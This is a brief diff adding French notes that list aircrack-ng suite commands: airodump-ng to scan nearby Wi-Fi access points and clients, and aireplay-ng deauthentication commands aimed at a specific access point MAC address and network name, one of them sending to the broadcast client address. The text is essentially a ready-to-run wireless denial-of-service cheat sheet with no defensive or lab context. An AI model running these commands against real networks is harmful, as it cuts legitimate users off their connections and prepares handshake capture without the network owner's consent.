@@ -1,0 +1,8 @@
+Scanne le reseau et affiche les AP et clients.
+	airodump-ng mon0
+	airodump-ng -c 6 mon0
+
+Deauth via aireplay
+	aireplay-ng -0 10 --ignore-negative-one -a 10:30:47:48:F3:99 -e JOHN_SNOW_MEURT_DANS_GOT mon0
+	aireplay-ng -0 10 -a 10:30:47:48:F3:99 -c 00:00:00:00:00:00 mon0
+
